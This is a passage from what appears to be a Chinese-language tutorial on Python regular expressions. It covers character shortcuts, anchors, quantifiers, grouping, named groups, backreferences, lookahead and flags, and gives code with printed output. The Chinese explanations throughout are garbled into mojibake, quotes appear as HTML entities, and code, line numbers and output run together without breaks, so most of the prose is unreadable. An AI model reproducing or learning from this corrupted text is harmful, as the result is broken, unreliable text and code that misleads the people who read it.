ï¼Œä¸ â€œä»»æ„å•è¯å­—ç¬¦â€åŒ¹é…ï¼Œåœ¨Python3ä¸­ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥åŒ¹é…ä»»ä½•è¯­è¨€çš„ä»»æ„å•è¯ã€‚è€Œå½“æˆ‘ä»¬æƒ³è¦åŒ¹é…ä»»æ„æ•°å­—çš„æ—¶å€™ä¹Ÿå¯ä»¥ä½¿ç”¨å¿«æ·æ–¹å¼ \\d då³digitï¼Œåœ¨Python3ä¸­å®ƒé™¤äº†å¯ä»¥å’Œ[0-9]åŒ¹é…ï¼Œè¿˜å¯ä»¥å’Œå…¶ä»–è¯­è¨€çš„æ•°å­—åŒ¹é…ã€‚\\så¿«æ·æ–¹å¼åŒ¹é…ç©ºç™½å­—ç¬¦ï¼Œæ¯”å¦‚ç©ºæ ¼ï¼Œtabã€æ¢è¡Œ ç­‰ã€‚\\b å¿«æ·æ–¹å¼åŒ¹é…ä¸€ä¸ªé•¿åº¦ä¸º0çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ï¼Œä»–ä»…ä»…åœ¨ä¸€ä¸ªå•è¯å¼€å§‹æˆ–ç»“å°¾å¤„åŒ¹é…ï¼Œè¿™è¢«ç§°ä¸ºè¯è¾¹ç•Œå¿«æ·æ–¹å¼å¿«æ·æ–¹å¼ æè¿°w ä¸ä»»æ„å•è¯åŒ¹é…d ä¸ä»»æ„æ•°å­—åŒ¹é…s åŒ¹é…ç©ºç™½å­—ç¬¦ï¼Œæ¯”å¦‚ç©ºæ ¼ tab æ¢è¡Œ ç­‰b åŒ¹é…ä¸€ä¸ªé•¿åº¦ä¸º0çš„å­ä¸² #ç©ºå­—ç¬¦&#x27;&#x27;&#x27;#ç¤ºä¾‹ï¼ša = re.findall(r&#x27;\\w&#x27;,&#x27;å­¦å¥½Python å¤§å±•æ‹³è„š&#x27;) #ä»»æ„å•è¯åŒ¹é…b = re.search(r&#x27;\\w&#x27;,&#x27;python3&#x27;) c = re.search(r&#x27;\\d&#x27;,&#x27;ç¼–å·89757&#x27;)print(a)print(b)print(c)#è¿™é‡Œfindallä¼šè¿”å›æ‰€æœ‰èƒ½åŒ¹é…çš„å€¼ï¼Œsearchåªä¼šè¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…åˆ°çš„å€¼d = re.findall(r&#x27;\\bmaster\\b&#x27;,&#x27;masterxiao-master-xxx master abc&#x27;)e = re.search(r&#x27;\\smaster\\s&#x27;,&#x27;masterxiao master xxxx&#x27;)print(d)print(e) [&#39;å­¦&#39;, &#39;å¥½&#39;, &#39;P&#39;, &#39;y&#39;, &#39;t&#39;, &#39;h&#39;, &#39;o&#39;, &#39;n&#39;, &#39;å¤§&#39;, &#39;å±•&#39;, &#39;æ‹³&#39;, &#39;è„š&#39;] &lt;re.Match object; span=(0, 1), match=&#39;p&#39;&gt; &lt;re.Match object; span=(2, 3), match=&#39;8&#39;&gt; [&#39;master&#39;, &#39;master&#39;] &lt;re.Match object; span=(10, 18), match=&#39; master &#39;&gt; 1234567891011121314151617#å¿«æ·æ–¹å¼å–å&#x27;&#x27;&#x27;ä¹‹å‰æåˆ°äº†å–åï¼Œå¿«æ·æ–¹å¼ä¹Ÿå¯ä»¥å–åï¼Œ ä¾‹å¦‚å¯¹äº \\wçš„å–åä¸º\\Wï¼Œå¯ä»¥å‘ç°å°†å°å†™æ”¹å†™æˆå¤§å†™å³å¯ã€‚æ³¨æ„è¿™é‡Œ\\B æœ‰æ‰€ä¸åŒï¼Œ b åŒ¹é…çš„æ˜¯åœ¨å•è¯å¼€å§‹æˆ–ç»“æŸä½ç½®é•¿åº¦ä¸º0çš„å­å­—ç¬¦ä¸²ï¼Œè€Œ\\BåŒ¹é…ä¸åœ¨å•è¯å¼€å§‹å’Œç»“æŸä½ç½®çš„é•¿åº¦ä¸º0çš„å­å­—ç¬¦ä¸²&#x27;&#x27;&#x27;a = re.findall(r&#x27;\\Bmaster\\B&#x27;,&#x27;masterxiao master xxx master abc&#x27;)b = re.search(r&#x27;master\\B&#x27;,&#x27;masterxiao&#x27;)c = re.findall(r&#x27;\\Bmaster\\B&#x27;,&#x27;1master1&#x27;)print(a)print(b)print(c) [] &lt;re.Match object; span=(0, 6), match=&#39;master&#39;&gt; [&#39;master&#39;] 1234567891011121314#å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“æŸa = re.search(r&#x27;^python&#x27;,&#x27;this code in python3&#x27;)b = re.search(r&#x27;python$&#x27;,&#x27;this code in python3&#x27;)c = re.search(r&#x27;^python&#x27;,&#x27;python is my favorite&#x27;)d = re.search(r&#x27;python$&#x27;,&#x27;this is code in python&#x27;)print(a)print(b)print(c)print(d)#é€šè¿‡ä¸Šè¿°ä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç° ^æŒ‡å®šçš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„å¼€å§‹ï¼Œ$æŒ‡å®šçš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„ç»“æŸ None None &lt;re.Match object; span=(0, 6), match=&#39;python&#39;&gt; &lt;re.Match object; span=(16, 22), match=&#39;python&#39;&gt; 12345678910111213#ä»»æ„å­—ç¬¦import re&#x27;&#x27;&#x27;.å­—ç¬¦æœ€åä¸€ä¸ªå¿«æ·æ–¹å¼å­—ç¬¦ï¼Œå®ƒä»£è¡¨åŒ¹é…ä»»ä½•å•ä¸ªå­—ç¬¦ï¼Œä¸è¿‡å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå®ƒåªèƒ½å‡ºç°åœ¨æ–¹æ‹¬å·å­—ç¬¦ç»„ä»¥å¤–å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š&lt;font color = &quot;red&quot;&gt;.å­—ç¬¦åªæœ‰ä¸€ä¸ªä¸èƒ½åŒ¹é…çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯æ¢è¡Œï¼ˆ\\nï¼‰ï¼Œ&lt;/font&gt;ï¼Œä¸è¿‡è®©.å­—ç¬¦ä¸æ¢è¡Œç¬¦åŒ¹é…ä¹Ÿæ˜¯å¯èƒ½çš„ï¼Œä»¥åä¼šè®¨è®º&#x27;&#x27;&#x27;a = re.search(r&#x27;p.th.n&#x27;,&#x27;hello python re&#x27;)b = re.search(r&#x27;p.....&#x27;,&#x27;å­¦å¥½ python äººè§äººçˆ±&#x27;)print(a)print(b) &lt;re.Match object; span=(6, 12), match=&#39;python&#39;&gt; &lt;re.Match object; span=(3, 9), match=&#39;python&#39;&gt; 1234567891011121314151617181920# å¯é€‰å­—ç¬¦&#x27;&#x27;&#x27;åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬çœ‹åˆ°çš„æ­£åˆ™è¡¨è¾¾å¼éƒ½æ˜¯åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„å­—ç¬¦ä¸è¢«æœç´¢çš„å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ä¿æŒ1:1çš„å…³ç³»ã€‚ä¸è¿‡æœ‰æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½æƒ³è¦åŒ¹é…ä¸€ä¸ªå•è¯çš„ä¸åŒå†™æ³•ï¼Œæ¯”å¦‚â€œcolorâ€å’Œâ€œcolourâ€ï¼Œæˆ–è€…â€œhonorâ€ä¸â€œhonourâ€ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ? ç¬¦å·æŒ‡å®šä¸€ä¸ªå­—ç¬¦ã€å­—ç¬¦ç»„æˆ–å…¶ä»–åŸºæœ¬å•å…ƒå¯é€‰ï¼Œè¿™æ„å‘³ç€æ­£åˆ™è¡¨è¾¾å¼å¼•æ“å°†ä¼šæœŸæœ›è¯¥å­—ç¬¦å‡ºç°é›¶æ¬¡æˆ–ä¸€æ¬¡&#x27;&#x27;&#x27;a = re.search(r&#x27;honou?r&#x27;,&#x27;He Served with honor and distinction&#x27;)b = re.search(r&#x27;honou?r&#x27;,&#x27;He Served with honour and distinction&#x27;)c = re.search(r&#x27;honou?r&#x27;,&#x27;He Served with honou and distinction&#x27;)print(a)print(b)print(c)&#x27;&#x27;&#x27;å¯ä»¥å‘ç°ï¼Œåœ¨ä¸Šè¿°ä¸‰ä¸ªä¾‹å­ä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¸ºhonou?rï¼Œè¿™é‡Œå¯ä»¥åŒ¹é…çš„æ˜¯ honor å’Œ honour ä¸èƒ½åŒ¹é… honouï¼Œå¯ä»¥çŸ¥é“çš„æ˜¯ ? ç¡®å®šäº†å‰ä¸€ä¸ªuæ˜¯å¯é€‰çš„ï¼Œåœ¨ç¬¬ä¸€ä¸ªç¤ºä¾‹ä¸­ï¼Œæ²¡æœ‰uï¼Œæ˜¯æ²¡æœ‰é—®é¢˜å¯ä»¥åŒ¹é…çš„ï¼Œåœ¨ç¬¬äºŒä¸ªç¤ºä¾‹ä¸­ï¼Œuå­˜åœ¨è¿™ä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚åœ¨ç¬¬ä¸‰ä¸ªä¾‹å­ä¸­ï¼Œuå­˜åœ¨ä½†æ˜¯rä¸å­˜åœ¨ï¼Œè¿™æ ·å°±ä¸èƒ½åŒ¹é…äº†&#x27;&#x27;&#x27; &lt;re.Match object; span=(15, 20), match=&#39;honor&#39;&gt; &lt;re.Match object; span=(15, 21), match=&#39;honour&#39;&gt; None 123456789# é‡å¤&#x27;&#x27;&#x27;åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬åªæ˜¯å­¦ä¹ äº†å…³äºä»…å‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ä¸²åŒ¹é…ï¼Œåœ¨å®é™…å¼€å‘è¿‡ç¨‹ä¸­ï¼Œè¿™æ ·è‚¯å®šä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œæ¯”å¦‚è¦åŒ¹é…ç”µè¯å·ç ï¼Œæ¯”å¦‚åŒ¹é…èº«ä»½è¯å·ï¼Œè¿™äº›éƒ½æ˜¯å¾ˆå¤šä¸ªæ•°å­—ç»„æˆçš„ã€‚å¦‚æœé‡åˆ°è¿™æ ·çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯èƒ½æœŸæœ›ä¸€ä¸ªå­—ç¬¦ç»„è¿ç»­åŒ¹é…å¥½å‡ æ¬¡ã€‚åœ¨æ­£åˆ™è¡¨è¾¾å¼åœ¨ä¸€ä¸ªå­—ç¬¦ç»„ååŠ ä¸Š&#123;N&#125; å°±å¯ä»¥è¡¨ç¤º &#123;N&#125; ä¹‹å‰çš„å­—ç¬¦ç»„å‡ºç°Næ¬¡&#x27;&#x27;&#x27;re.findall(r&#x27;[\\d]&#123;4&#125;-[\\d]&#123;7&#125;&#x27;,&#x27;å¼ ä¸‰ï¼š0731-8825951ï¼Œæå››ï¼š0733-8794561&#x27;) [&#39;0731-8825951&#39;, &#39;0733-8794561&#39;] 12345678910111213141516171819202122#é‡å¤åŒºé—´&#x27;&#x27;&#x27;å¯èƒ½æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬ä¸çŸ¥é“å…·ä½“è¦åŒ¹é…å­—ç¬¦ç»„è¦é‡å¤çš„æ¬¡æ•°ï¼Œæ¯”å¦‚èº«ä»½è¯æœ‰15ä½ä¹Ÿæœ‰18ä½çš„ã€‚è¿™é‡Œé‡å¤åŒºé—´å°±å¯ä»¥å‡ºåœºäº†ï¼Œè¯­æ³•ï¼š&#123;M,N&#125;ï¼ŒMæ˜¯ä¸‹ç•Œè€ŒNæ˜¯ä¸Šç•Œä¸¾ä¸ªä¾‹å­ï¼š&#x27;&#x27;&#x27;a = re.search(r&#x27;[\\d]&#123;3,4&#125;&#x27;,&#x27;0731&#x27;)b = re.search(r&#x27;[\\d]&#123;3,4&#125;&#x27;,&#x27;073&#x27;)print(a)print(b)&#x27;&#x27;&#x27;é€šè¿‡ä¸Šè¿°ä»£ç ï¼Œæˆ‘ä»¬å‘ç°[\\d]&#123;3,4&#125; æ—¢å¯ä»¥åŒ¹é…3ä¸ªæ•°å­—ä¹Ÿå¯ä»¥åŒ¹é…4ä¸ªæ•°å­—ï¼Œä¸è¿‡å½“æœ‰4ä¸ªæ•°å­—çš„æ—¶å€™ï¼Œä¼˜å…ˆåŒ¹é…çš„æ˜¯4ä¸ªæ•°å­—ï¼Œè¿™æ˜¯å› ä¸ºæ­£åˆ™è¡¨è¾¾å¼é»˜è®¤æ˜¯è´ªå©ªæ¨¡å¼ï¼Œå³å°½å¯èƒ½çš„åŒ¹é…æ›´å¤šå­—ç¬¦ï¼Œè€Œè¦ä½¿ç”¨éè´ªå©ªæ¨¡å¼ï¼Œæˆ‘ä»¬è¦åœ¨è¡¨è¾¾å¼åé¢åŠ ä¸Š ?å·&#x27;&#x27;&#x27;d = re.search(r&#x27;[\\d]&#123;3,4&#125;?&#x27;,&#x27;0734&#x27;)e = re.search(r&#x27;[\\d]&#123;2,3&#125;?&#x27;,&#x27;073&#x27;)print(d)print(e) &lt;re.Match object; span=(0, 4), match=&#39;0731&#39;&gt; &lt;re.Match object; span=(0, 3), match=&#39;073&#39;&gt; &lt;re.Match object; span=(0, 3), match=&#39;073&#39;&gt; &lt;re.Match object; span=(0, 2), match=&#39;07&#39;&gt; 12345#å¼€é—­åŒºé—´#æœ‰æ—¶å€™æˆ‘ä»¬å¯èƒ½é‡åˆ°å­—ç¬¦ç»„çš„é‡å¤æ¬¡æ•°æ²¡æœ‰è¾¹ç•Œï¼š#é—­åŒºé—´ä¸å†™å³å¯è¡¨ç¤ºåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªã€‚a = re.search(r&#x27;[\\d]&#123;1,&#125;&#x27;,&#x27;0731 xxx&#x27;)print(a) &lt;re.Match object; span=(0, 4), match=&#39;0731&#39;&gt; 12345678#é€Ÿå†™#è¿˜å¯ä»¥ä½¿ç”¨ä¸¤ä¸ªé€Ÿå†™å­—ç¬¦æŒ‡å®šå¸¸è§çš„é‡å¤æƒ…å†µï¼Œ#å¯ä»¥ä½¿ç”¨ + åŒ¹é…1ä¸ªæˆ–å¤šä¸ªï¼Œ#ä½¿ç”¨ *ä»£è¡¨0ä¸ªæˆ–å¤šä¸ªa = re.findall(r&#x27;[\\d]+&#x27;,&#x27;0731-8859456&#x27;)b = re.findall(r&#x27;[\\d]*&#x27;,&#x27;ç¼–å·89758&#x27;)print(a)print(b) [&#39;0731&#39;, &#39;8859456&#39;] [&#39;&#39;, &#39;&#39;, &#39;89758&#39;, &#39;&#39;] 1234567891011#åˆ†ç»„&#x27;&#x27;&#x27;åœ¨Pythonæ­£åˆ™ä¸­è¿˜æä¾›äº†ä¸€ç§æœºåˆ¶å°†è¡¨è¾¾å¼â€”â€”åˆ†ç»„ï¼Œå½“ä½¿ç”¨åˆ†ç»„æ—¶ï¼Œé™¤äº†è·å¾—æ•´ä¸ªåŒ¹é…ã€‚è¿˜èƒ½å¤Ÿåœ¨åŒ¹é…ä¸­é€‰æ‹©æ¯ä¸€ä¸ªåˆ†ç»„ã€‚è¦å®ç°åˆ†ç»„å¾ˆç®€å•ï¼Œä½¿ç”¨()å³å¯ã€‚&#x27;&#x27;&#x27;a = re.search(r&#x27;([\\d]&#123;4&#125;)-([\\d]&#123;7&#125;)&#x27;,&#x27;å¼ ä¸‰ï¼š0731-8825951&#x27;) #æœªä½¿ç”¨åˆ†ç»„print(a.group())print(a.groups())print(a.group(1))print(a.group(2)) 0731-8825951 (&#39;0731&#39;, &#39;8825951&#39;) 0731 8825951 1234567891011#ç»ƒä¹  è¯†åˆ«ä¸­å›½ç”µè¯å·ç #ä¸­å›½åŒºå·ç è§„åˆ™å¦‚ä¸‹ï¼š (+)86-0XXï¼ˆ0XXXï¼‰-XXX-XXXXï¼ˆXXXX-XXXXï¼‰phone=&#x27;&#x27;&#x27;+86-010-8286693186010-82866931010 8286 693186(010)-6967521786(0731)-728-3333(0731)-2728-3353&#x27;&#x27;&#x27;#è¯·ä½ ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å°†è¿™äº›å·ç æå–æˆåˆ†ç»„å½¢å¼ 1234567891011121314151617181920212223242526272829303132333435363738394041#å‘½ååˆ†ç»„#ä¸€ä¸ªå‘½ååˆ†ç»„çš„è¯­æ³•æ˜¯åœ¨å¼€å§‹çš„â€œ(â€ä¹‹åï¼Œæ·»åŠ ?P&lt;group_name&gt;ï¼Œæ¥å®ç°åˆ†ç»„ï¼Œä¾‹å¦‚ï¼šimport rea = re.search(r&#x27;[\\d]&#123;4&#125;-[\\d]&#123;7&#125;&#x27;,&#x27;å¼ ä¸‰ï¼š0731-8825951&#x27;)b = re.search(r&#x27;(?P&lt;first_group&gt;[\\d]&#123;4&#125;)-(?P&lt;second_group&gt;[\\d]&#123;7&#125;)&#x27;,&#x27;å¼ ä¸‰ï¼š0731-8825951&#x27;)print(a)print(a.group)print(a.groups)print(&quot; -&quot;*30)print(b)print(b.group())print(b.groups())print(b.group(0))print(b.group(1))print(b.group(2))print(&quot; -&quot;*30)print(b.group(&#x27;first_group&#x27;))print(b.group(&#x27;second_group&#x27;))print(b.groupdict())&#x27;&#x27;&#x27;re.search()æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªre.Matchå¯¹è±¡ï¼Œè¿è¡Œä¸Šè¿°ä¾‹å­æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œä½¿ç”¨ ?P&lt;group_name&gt; å¯ä»¥å®ç°åˆ†ç»„ï¼Œ ä½¿ç”¨ .group(group_name)å°†åˆ†ç»„åä¼ å…¥group()å‡½æ•°å¯ä»¥è·å–å¯¹åº”åç§°åˆ†ç»„çš„æ•°æ®ï¼ŒåŒæ ·ä½¿ç”¨ç´¢å¼• ä¹Ÿæ˜¯å¯ä»¥è·å–å¯¹åº”åˆ†ç»„çš„æ•°æ®çš„ã€‚Matchå¯¹è±¡è¿˜æä¾›äº†ä¸€ä¸ªgroupdict()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åœ¨å’Œgroups()æ–¹æ³•ç±»ä¼¼ï¼Œä¸è¿‡å®ƒè¿”å›çš„æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè€Œgroups()æ”¾å›çš„æ˜¯ä¸€ä¸ªå…ƒç¥–ã€‚ä¸è¿‡å€¼å¾—æ³¨æ„çš„æ˜¯ï¼šgroupdict()åªä¼šè¿”å›å‘½ååˆ†ç»„è€Œä¸ä¼šè¿”å›éå‘½ååˆ†ç»„&#x27;&#x27;&#x27;match = re.search(r&#x27;(?P&lt;first_group&gt;[\\d]&#123;4&#125;)-([\\d]&#123;7&#125;)&#x27;,&#x27;å¼ ä¸‰ï¼š0731-8825951&#x27;) #ä½¿ç”¨åˆ†ç»„print(match.group())print(match.groups())print(match.groupdict())&quot;&quot;&quot;åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªæ˜¯å‘½ååˆ†ç»„ï¼Œç¬¬äºŒä¸ªæ˜¯ç¼–ç åˆ†ç»„ï¼Œæ‰€ä»¥å½“è°ƒç”¨groups()æ—¶ï¼Œè¿™ä¸¤ä¸ªåˆ†ç»„éƒ½åœ¨å…ƒç¥–ä¸­è¿”å›ï¼Œä½†æ˜¯ï¼Œå½“è°ƒç”¨groupdictæ—¶ï¼Œè¿™ä¸¤ä¸ªåˆ†ç»„åˆ™åªæœ‰å‘½ååˆ†ç»„è¢«è¿”å›äº†ï¼Œå¦‚æœä»å¯ç»´æŠ¤çš„è§’åº¦æ¥è¯´ï¼Œå‘½ååˆ†ç»„ååˆ†æœ‰ä»·å€¼&quot;&quot;&quot; &lt;re.Match object; span=(3, 15), match=&#39;0731-8825951&#39;&gt; &lt;built-in method group of re.Match object at 0x0000016EDCFF0B90&gt; &lt;built-in method groups of re.Match object at 0x0000016EDCFF0B90&gt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &lt;re.Match object; span=(3, 15), match=&#39;0731-8825951&#39;&gt; 0731-8825951 (&#39;0731&#39;, &#39;8825951&#39;) 0731-8825951 0731 8825951 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 0731 8825951 &#123;&#39;first_group&#39;: &#39;0731&#39;, &#39;second_group&#39;: &#39;8825951&#39;&#125; 0731-8825951 (&#39;0731&#39;, &#39;8825951&#39;) &#123;&#39;first_group&#39;: &#39;0731&#39;&#125; &#39;\\nåœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªæ˜¯å‘½ååˆ†ç»„ï¼Œç¬¬äºŒä¸ªæ˜¯ç¼–ç åˆ†ç»„ï¼Œæ‰€ä»¥å½“è°ƒç”¨groups()æ—¶ï¼Œ\\nè¿™ä¸¤ä¸ªåˆ†ç»„éƒ½åœ¨å…ƒç¥–ä¸­è¿”å›ï¼Œä½†æ˜¯ï¼Œå½“è°ƒç”¨groupdictæ—¶ï¼Œè¿™ä¸¤ä¸ªåˆ†ç»„åˆ™åªæœ‰å‘½ååˆ†ç»„è¢«è¿”å›äº†ï¼Œ\\nå¦‚æœä»å¯ç»´æŠ¤çš„è§’åº¦æ¥è¯´ï¼Œå‘½ååˆ†ç»„ååˆ†æœ‰ä»·å€¼\\n\\n&#39; 1234567891011121314151617181920212223242526272829# å¼•ç”¨å·²ç»å­˜åœ¨çš„åˆ†ç»„&#x27;&#x27;&#x27;æ­£åˆ™è¡¨è¾¾å¼è¿˜æä¾›äº†ä¸€ç§å¼•ç”¨ä¸€ä¸ªä¹‹å‰åŒ¹é…åˆ†ç»„çš„æœºåˆ¶ï¼Œæœ‰äº›æ—¶å€™ï¼Œæˆ‘ä»¬æˆ–è®¸ä¼šå¯»æ‰¾åˆ°ä¸€ä¸ªå­åŒ¹é…ï¼Œè¯¥åŒ¹é…ä¼šæ¥ä¸‹æ¥å†æ¬¡å‡ºç°ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•è§£æä¸€æ®µXMLä»£ç ï¼Œæ¯”å¦‚ï¼š&lt;font&gt;æç¤º&lt;/font&gt;ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šç¼–å†™å‡ºè¿™æ ·ä¸€æ®µä»£ç ï¼š&#x27;&#x27;&#x27;a = re.search(r&#x27;&lt;[\\w_-]+&gt;æç¤º&lt;/[\\w_-]+&gt;&#x27;,&#x27;&lt;font&gt;æç¤º&lt;/font&gt;&#x27;)print(a)#ä¸Šè¿°ä»£ç ç¡®å®å¯ä»¥åŒ¹é…ï¼Œä¸è¿‡ä¹Ÿå­˜åœ¨å¦ä¸€ç§æƒ…å†µï¼Œå¦‚æœè§£æçš„æ˜¯å¦‚ä¸‹æ•°æ®ï¼š&lt;font&gt;æç¤º&lt;/bar&gt;b = re.search(r&#x27;&lt;([\\w_-]+)&gt;æç¤º&lt;(/[\\w_-]+)&gt;&#x27;,&#x27;&lt;font&gt;æç¤º&lt;/bar&gt;&#x27;)print(b)print(b.group(1))print(b.group(2))print(&quot; -&quot;*30)#è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯èƒ½ç›´è§‰çš„æƒ³è®©åé¢åˆ†ç»„çš„æ­£åˆ™ä¹ŸåŒ¹é…fontï¼Œä¸è¿‡å®é™…æƒ…å†µç¡®æ˜¯ï¼Œ#æ‰€æœ‰å½¢å¼çš„éƒ½ä¼šåŒ¹é…ï¼Œé‚£å¦‚æœæˆ‘ä»¬æƒ³è®©åé¢çš„æ­£åˆ™å’Œç¬¬ä¸€ä¸ªåˆ†ç»„çš„æ­£åˆ™è¯¥å¦‚ä½•åšå‘¢ï¼Ÿ#å¯ä»¥ä½¿ç”¨åˆ†ç»„å¼•ç”¨ï¼Œä½¿ç”¨\\Nå³å¯å›æº¯å¼•ç”¨ç¼–å·ä¸ºNçš„åˆ†ç»„ï¼Œå› æ­¤ä¸Šè¿°ä¾‹å­çš„ä»£ç æˆ‘ä»¬å¯ä»¥æ”¹ä¸ºï¼ša = re.search(r&#x27;&lt;([\\w_-]+)&gt;æç¤º&lt;/\\1&gt;&#x27;,&#x27;&lt;font&gt;æç¤º&lt;/bar&gt;&#x27;)b = re.search(r&#x27;&lt;([\\w_-]+)&gt;æç¤º&lt;/\\1&gt;&#x27;,&#x27;&lt;font&gt;æç¤º&lt;/font&gt;&#x27;)print(a)print(b.group())print(b.groups())#é€šè¿‡ä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å›æº¯å¼•ç”¨å–ä»£äº†ç¬¬äºŒä¸ªåˆ†ç»„ã€‚æ‰€ä»¥ä¸fontä¸åŒçš„å°±æ— æ³•åŒ¹é…äº†ï¼›#å€¼çš„æ³¨æ„çš„æ˜¯ï¼šè¿™é‡Œåªæ˜¯ä¸€ä¸ªä½œä¸ºä»‹ç»å›æº¯å¼•ç”¨çš„ä¾‹å­ï¼Œ#åœ¨å®é™…å¼€å‘ä¸­æˆ‘ä»¬ä¸åº”è¯¥ç”¨è¿™ç§æ–¹å¼å»è§£æXMLæ–‡æ¡£ï¼Œå¯ä»¥ä½¿ç”¨beautifulSoapç­‰åŒ…å»è§£æXMLæ–‡ä»¶ &lt;re.Match object; span=(0, 15), match=&#39;&lt;font&gt;æç¤º&lt;/font&gt;&#39;&gt; &lt;re.Match object; span=(0, 14), match=&#39;&lt;font&gt;æç¤º&lt;/bar&gt;&#39;&gt; font /bar - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - None &lt;font&gt;æç¤º&lt;/font&gt; (&#39;font&#39;,) 12345678910111213#å…ˆè¡Œæ–­è¨€a = re.findall(r&#x27;n(?!e)&#x27;,&#x27;final&#x27;)b = re.findall(r&#x27;n(?!e)&#x27;,&#x27;python&#x27;)print(a)print(b)print(&quot; -&quot; * 30)#æ­£å‘å…ˆè¡Œæ–­è¨€c = re.findall(r&#x27;n(?=e)&#x27;,&#x27;final&#x27;)d = re.findall(r&#x27;n(?=e)&#x27;,&#x27;python&#x27;)e = re.findall(r&#x27;n(?=e)&#x27;,&#x27;jasmine&#x27;)print(c)print(d)print(e) [&#39;n&#39;] [&#39;n&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [] [] [&#39;n&#39;] 123456789101112131415161718192021222324252627282930313233343536#æ ‡è®°ï¼Œä¸åŒºåˆ†å¤§å°å†™#æœ€ç®€å•ç›´æ¥çš„æ ‡è®°æ˜¯ re.IGNORECASEï¼Œä»–ä¼šå¯¼è‡´æ­£åˆ™è¡¨è¾¾å¼å˜ä¸ºä¸åŒºåˆ†å¤§å°å†™a = re.search(r&#x27;python&#x27;,&#x27;I LIKE PYTHON&#x27;,re.IGNORECASE)b = re.search(r&#x27;python&#x27;,&#x27;I LIKE PYTHON&#x27;,re.I)print(a)print(b)print(&quot; -&quot; * 30)#ç‚¹åŒ¹é…æ¢è¡Œç¬¦#re.DOTALLæ ‡è®°ï¼ˆåˆ«åä¸ºre.Sï¼‰å¯ä»¥è®© .å­—ç¬¦é™¤äº†åŒ¹é…å…¶ä»–å­—ç¬¦ä¹‹å¤–ï¼Œè¿˜åŒ¹é…æ¢è¡Œç¬¦ã€‚a = re.search(r&#x27;.+&#x27;,&#x27;hello\\nworld&#x27;)b = re.search(r&#x27;.+&#x27;,&#x27;hello\\nworld&#x27;,re.S)c = re.search(r&#x27;.+&#x27;,&#x27;hello\\nworld&#x27;,re.DOTALL)print(a)print(b)print(c)#è¯¦ç»†æ¨¡å¼&#x27;&#x27;&#x27;re.VERBOSEæ ‡è®°(åˆ«åä¸ºre.X)å…è®¸å¤æ‚çš„æ­£åˆ™è¡¨è¾¾å¼ä»¥æ›´å®¹æ˜“çš„æ–¹å¼è¡¨ç¤ºè¯¥æ ‡è®°åšä¸¤ä»¶äº‹ï¼Œé¦–å…ˆï¼Œä»–å¯¼è‡´æ‰€æœ‰çš„ç©ºç™½ï¼ˆé™¤äº†å­—ç¬¦ç»„ä¸­ï¼‰è¢«å¿½ç•¥ï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦ã€‚å…¶æ¬¡ï¼Œå®ƒå°†#å­—ç¬¦ï¼ˆåŒæ ·ï¼Œé™¤éåœ¨å­—ç¬¦ç»„å†…ï¼‰å½“åšæ³¨é‡Šå­—ç¬¦&#x27;&#x27;&#x27;#è°ƒè¯•æ¨¡å¼#re.DEBUG æ ‡è®°ï¼ˆæ²¡æœ‰åˆ«åï¼‰åœ¨ç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼æ—¶å°†ä¸€äº›è°ƒè¯•ä¿¡æ¯è¾“å‡ºåˆ°sys.stderr&#x27;&#x27;&#x27;ä½¿ç”¨å¤šä¸ªæ ‡è®°å¯èƒ½æˆ‘ä»¬è¿˜éœ€è¦åŒæ—¶ä½¿ç”¨å¤šä¸ªæ ‡è®°ï¼Œä¸ºäº†å®Œæˆè¿™ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨|æ“ä½œç¬¦ã€‚æ­£ç¡®çš„è¯­æ³•æ˜¯ä¾‹å¦‚ï¼šre.DOTALL|re.MULTILINE æˆ– re.S | re.M&#x27;&#x27;&#x27;#å†…è”æ ‡è®°print(&quot; -&quot; * 30)f = re.search(&#x27;(?i)Foo&#x27;,&#x27;foo&#x27;)print(f)#å¯ä»¥å‘ç°è¿™é‡Œçš„(?i)ï¼Œå°±ç­‰åŒäºä½¿ç”¨re.IGNORECASE æ ‡è®°ã€‚ &lt;re.Match object; span=(7, 13), match=&#39;PYTHON&#39;&gt; &lt;re.Match object; span=(7, 13), match=&#39;PYTHON&#39;&gt; - - - - - - - - 